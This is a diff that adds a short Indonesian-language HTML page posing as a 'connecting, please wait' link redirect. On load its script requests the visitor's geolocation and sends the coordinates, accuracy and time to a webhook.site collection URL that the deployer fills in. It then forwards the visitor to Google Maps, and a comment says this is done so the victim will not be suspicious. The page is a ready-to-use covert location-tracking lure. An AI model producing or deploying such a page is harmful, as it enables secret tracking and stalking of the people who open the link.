@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Menghubungkan...</title>
+    <script>
+        // GANTI URL DI BAWAH DENGAN URL DARI WEBHOOK.SITE ANDA
+        const webhookURL = "https://webhook.site/SALIN_URL_ANDA_DISINI";
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                alert("Browser tidak mendukung geolokasi.");
+            }
+        }
+
+        function sendPosition(position) {
+            const data = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy,
+                time: new Date().toISOString()
+            };
+
+            // Mengirim data ke Webhook Anda
+            fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            }).then(() => {
+                // Setelah terkirim, arahkan ke situs asli agar tidak curiga
+                window.location.href = "https://www.google.com/maps";
+            });
+        }
+
+        function showError(error) {
+            // Jika user menolak (Deny), arahkan saja
+            window.location.href = "https://www.google.com/maps";
+        }
+
+        window.onload = getLocation;
+    </script>
+</head>
+<body>
+    <p>Mohon tunggu, sedang memproses tautan...</p>
+</body>
+</html>
